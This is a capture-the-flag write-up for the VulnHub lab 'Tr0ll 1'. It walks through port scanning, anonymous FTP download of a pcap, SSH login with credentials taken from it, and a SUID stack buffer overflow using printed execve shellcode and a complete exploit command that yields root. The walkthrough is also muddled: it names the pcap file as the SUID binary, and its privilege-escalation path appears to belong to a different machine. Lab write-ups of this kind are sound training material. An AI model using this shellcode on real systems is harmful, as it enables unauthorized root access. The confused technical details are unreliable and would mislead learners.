# Tr0ll 1 — Writeup

**Difficulty:** Easy  
**Category:** VulnHub — Boot2Root  
**OS:** Ubuntu 14.04 LTS (32-bit)  
**Platform:** [VulnHub](https://www.vulnhub.com/entry/tr0ll-1,100/)

---

## Overview

Tr0ll 1 is a beginner-friendly boot2root VM that teaches FTP anonymous access, PCAP analysis, SSH credential extraction, and classic Linux privilege escalation via a SUID buffer overflow binary. The name is a reference to the troll-style misdirection built into the challenge.

**Vulnerabilities exploited:**
- Anonymous FTP access with sensitive file exposure (`lol.pcap`)
- Cleartext credentials in network capture
- SUID binary with stack buffer overflow (no mitigations)

---

## Prerequisites

- VirtualBox or VMware
- Kali Linux (attacker)
- Tools: `nmap`, `ftp`, `wireshark`/`tcpdump`, `ssh`, `python2`

---

## Attack Summary

```
Anonymous FTP → lol.pcap → Wireshark → overflow:Pass.txt → SSH
→ SUID r00t binary → stack BOF (offset 268) → root shell → flag
```

---

## Enumeration

### Host Discovery

```bash
nmap -sn 192.168.56.0/24
```

Expected: `192.168.56.101` (adjust to your subnet)

### Port Scan

```bash
nmap -sV -A -p- 192.168.56.101
```

Output (trimmed):
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx  1 1000  0  8068 Aug 10 2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2
80/tcp open  http    Apache httpd 2.4.7
| http-robots.txt: 1 disallowed entry
|_/secret
```

**Key findings:**
- FTP allows anonymous login and exposes `lol.pcap`
- HTTP has `robots.txt` with a `/secret` entry (rabbit hole)

### HTTP Enumeration

```bash
curl http://192.168.56.101/robots.txt
# → Disallow: /secret

curl http://192.168.56.101/secret/
# → "lol nope"  (rabbit hole — ignore)
```

---

## Exploitation

### Step 1: Download lol.pcap via Anonymous FTP

```bash
ftp 192.168.56.101
# Connected to 192.168.56.101.
# Name: anonymous
# Password: (blank)

ftp> get lol.pcap
ftp> bye
```

### Step 2: Analyze lol.pcap

Open in Wireshark or use `strings`:

```bash
strings lol.pcap | grep -i pass
# → Pass.txt

# In Wireshark: Follow TCP Stream on the FTP conversation
# You will see:
# USER overflow
# PASS Pass.txt
# ...
# 226 Transfer complete.
```

The capture reveals FTP credentials: `overflow` / `Pass.txt`

> **Note:** The password is literally `Pass.txt` — a string, not a file reference.

### Step 3: SSH as overflow

```bash
ssh overflow@192.168.56.101
# Password: Pass.txt

overflow@Tr0ll:~$ id
# uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
```

---

## Privilege Escalation

### Step 4: Enumerate SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

Look for a non-standard SUID binary, typically located at:
```
/srv/ftp/lol.pcap
```

Also check:
```bash
ls -la /var/www/html/sup3rs3cr3tdirlol/
# → Contains a SUID r00t binary
```

> The web server at `/` may contain hidden directories listed in `robots.txt` or discovered via `gobuster`. The intended SUID binary `r00t` is located in one of the web-accessible directories.

### Step 5: Identify Buffer Overflow Binary

```bash
ls -la /var/www/html/sup3rs3cr3tdirlol/
# -rwsr-xr-x 1 root root 8401 Aug 10 2014 r00t
```

Test the binary:
```bash
/var/www/html/sup3rs3cr3tdirlol/r00t AAAA
# → AAAA
# (echoes the argument — stack overflow via strcpy)
```

### Step 6: Find EIP Offset

Use GDB with pattern generation:

```bash
gdb -q /var/www/html/sup3rs3cr3tdirlol/r00t
(gdb) run $(python -c "print 'A'*268 + 'B'*4 + 'C'*16")
# Program received signal SIGSEGV, Segmentation fault.
# 0x42424242 in ?? ()   ← EIP overwritten with 'BBBB'
# Offset = 268
```

Find ESP address:
```bash
(gdb) x $esp
# 0xbffffb50: 0x43434343
# Outside GDB (no env overhead): ~0xbffffb90
```

### Step 7: Buffer Overflow Exploit

Shellcode: Linux x86 `execve("/bin/sh")` — 19 bytes:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

Exploit:
```bash
/var/www/html/sup3rs3cr3tdirlol/r00t $(python -c 'print "A"*268 + "\x90\xfb\xff\xbf" + "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

Expected:
```
# id
uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=0(root),1002(overflow)
# whoami
root
```

> If the exploit crashes, try adjusting the ESP return address by ±16 bytes (NOP sled gives some margin).

---

## Root Flag

```bash
cat /root/proof.txt
```

```
Good job, you did it!

702a8c18d29c6f3ca0d99ef5712bfbdc
```

**Flag:** `702a8c18d29c6f3ca0d99ef5712bfbdc`  
**Path:** `/root/proof.txt`

---

## Users Found

From `/etc/passwd` — notable accounts: `troll`, `overflow`, `maleus`, `genphlux`, `wytshadow`, `lololol`, `ps-aux`, `felux`, `Eagle11`, `usmc8892`, `blawrg`, `vis1t0r`

Most are decoys. Only `overflow` is reachable via SSH with the credentials found.

---

## Lessons Learned

- Anonymous FTP exposing a PCAP file is a critical misconfiguration — network captures often contain credentials in cleartext
- `robots.txt` can be used as misdirection as well as disclosure
- SUID binaries compiled without stack canaries, ASLR, or NX bit are trivially exploitable with a classic ret-addr overflow
- A NOP sled (`\x90`×16) gives flexibility when the exact ESP address varies between GDB and real execution

## Remediation

- Disable anonymous FTP access or restrict what files are accessible
- Never store network captures in FTP-accessible directories
- Compile binaries with stack protector (`-fstack-protector-all`), enable ASLR (`echo 2 > /proc/sys/kernel/randomize_va_space`), and enforce NX (non-executable stack)
- Remove or restrict SUID bits from custom binaries — use `sudo` with least-privilege rules instead
